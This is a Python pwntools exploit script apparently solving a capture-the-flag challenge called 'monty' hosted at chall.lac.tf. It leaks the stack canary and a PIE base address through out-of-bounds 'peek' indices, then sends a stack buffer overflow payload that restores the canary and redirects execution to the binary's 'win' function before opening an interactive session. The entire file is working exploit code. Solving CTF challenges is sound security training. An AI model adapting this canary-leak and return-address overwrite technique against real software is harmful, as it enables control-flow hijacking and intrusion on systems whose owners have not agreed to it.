#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import time
from ctypes import CDLL

from pwn import *

elf = context.binary = ELF("./monty", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc chall.lac.tf 31132"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()
io.sendlineafter(b"peek? ", b"-27")
io.recvuntil(b"Peek 1: ")
canary = int(io.recvline().strip())
log.info(f"{canary=:#x}")
io.sendlineafter(b"peek? ", b"-3")
io.recvuntil(b"Peek 2: ")
pie_leak = int(io.recvline().strip())
elf.address = pie_leak - 0x14c0
log.info(f"{elf.address=:#x}")

io.sendlineafter(b"lady! ", b"0")
payload = b"A" * 0x18
payload += flat(
    canary,
    elf.bss(0xc00),
    elf.sym["win"]
)
io.sendlineafter(b"Name: ", payload)

io.interactive()
